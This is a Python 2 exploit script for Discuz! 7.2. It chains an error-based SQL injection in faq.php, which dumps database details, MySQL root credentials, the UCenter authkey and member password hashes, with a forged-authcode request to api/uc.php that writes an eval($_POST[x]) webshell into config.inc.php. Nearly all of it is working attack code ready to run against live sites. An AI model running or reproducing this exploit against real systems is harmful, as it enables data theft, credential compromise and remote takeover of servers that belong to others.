#!/usr/bin/env python
# coding=utf-8

import urllib
import urllib2
import re
import sys
import hashlib
import time
import math
import base64
import optparse


def banner():
  print '''
|---------------------------------------------------------------|
| [*] Exp faq.php  <= disz 7.2      -> by webhhh QQ:2969192549  |
|---------------------------------------------------------------|
        '''

g_usage_url = ""
g_usage_num = "1"
g_usage_shell = "N"

def usage():
    banner()
    
    MSG_USAGE = "diz7.2.py [-u <url>] [-n <get info num>] [-s <get shell>]"
    parser = optparse.OptionParser(MSG_USAGE) 
    parser.add_option("-u", dest="url", help="host url")
    parser.add_option("-n", dest="number", default='1', help="get info num [default: 1]")   
    parser.add_option("-s", dest="shell",action="store_true", help="get shell")     
    (options, args) = parser.parse_args() 

    global g_usage_url
    global g_usage_num
    global g_usage_shell

    g_usage_url = options.url
    if g_usage_url is None or g_usage_url is '':
        print "error: para error"
        exit(0)

    g_usage_num = options.number
    g_usage_shell = 'Y' if options.shell else 'N'


def gethtml(url, sql):
    link = url + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat("
    link = link + "("+ urllib.quote(sql) + "),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
    fd = urllib2.urlopen(link)

    #print fd.readlines()
    errorinfo = None
    for line in fd.readlines():
        if line.find("Duplicate entry") != -1:
            errorinfo = line
            break

    #print errorinfo
    if errorinfo is None:
        return None

    ret = errorinfo.split("\'")[1][0:-1]
    if ret is None:
        return None

    #print ret
    return ret

def microtime(get_as_float = False) :
    if get_as_float:
        return time.time()
    else:
        return '%.8f %d' % math.modf(time.time())

def get_authcode(string, key = ''):
    ckey_length = 4
    key = hashlib.md5(key).hexdigest()
    keya = hashlib.md5(key[0:16]).hexdigest()
    keyb = hashlib.md5(key[16:32]).hexdigest()
    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest() 
    key_length = len(cryptkey)
    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
    string_length = len(string)
    result = ''
    box = range(0, 256)
    rndkey = dict()
    for i in range(0,256):
        rndkey[i] = ord(cryptkey[i % key_length])
    j=0
    for i in range(0,256):
        j = (j + box[i] + rndkey[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = tmp
    a=0
    j=0
    for i in range(0,string_length):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        tmp = box[a]
        box[a] = box[j]
        box[j] = tmp
        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
    return keyc + base64.b64encode(result).replace('=', '')


def getshell(url, key, host):
    headers={'Accept-Language':'zh-cn',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
    'Referer':url
    }
    tm = time.time()+10*3600
    tm="time=%d&action=updateapps" %tm
    code = urllib.quote(get_authcode(tm,key))
    url=url+"?code="+code
    data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://xxx\');eval($_POST[x]);//</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data1,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "[!] GetWebshell Exploit Falied"

    data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://aaa</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data2,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "[!] GetWebshell error"

    try:
    	req=urllib2.Request(host+'/config.inc.php')
    	res=urllib2.urlopen(req,timeout=20).read()
    except Exception, e:
    	print ' [!] GetWebshell Failed,%s'%(e)
     	return

    print 
    print " [Webshell]"
    print "   [Path]          -> %s" %  (host+"/config.inc.php")
    print "   [Password]      -> x"
    print


def main():
    usage()

    url = g_usage_url
    dbversion = gethtml(url, "version()")
    dbuser = gethtml(url, "user()")
    dbdatabase = gethtml(url, "database()")
    dblen = gethtml(url, "select count(password) from ucenter.uc_members ")
    root_user = gethtml(url, "select user from mysql.user limit 0,1")
    root_password = gethtml(url, "select password from mysql.user limit 0,1")
    #tablePrefix = gethtml(url, "select hex(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where table_schema=database() limit 0,1")

    # 错误输出最大长充有限制分两次查询
    authkey1 = gethtml(url, "select substr(authkey,1,62) from ucenter.uc_applications limit 0,1") 
    authkey2 = gethtml(url, "select substr(authkey,63,2) from ucenter.uc_applications limit 0,1")
    authkey = authkey1 + authkey2

    print
    print u" [数据库信息]"
    print "   [Version]       -> %s" % dbversion
    print "   [Curr User]     -> %s" % dbuser
    print "   [Curr Db]       -> %s" % dbdatabase
    print "   [Root User]     -> %s" % root_user
    print "   [Root password] -> %s" % root_password    
    print "   [authkey]       -> %s" % authkey
    print "   [Sum of Users]  -> %s" % dblen
    print 

    print u" [用户信息] "
    for loop in range(int(dblen)):
        if loop >= int(g_usage_num):
            break
        try:
            username = gethtml(url, "select username from ucenter.uc_members limit %d,1" % loop)
            password = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)
            salt = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)

            print "   [%d] " % (loop+1)
            print "   [User]          -> %s" % username
            print "   [password]      -> %s" % password
            print

        except Exception,e:
            print e
            continue


    if g_usage_shell == 'Y':
        getshell(url + '/api/uc.php', authkey, url)
#main()


if __name__ == "__main__":
    main()


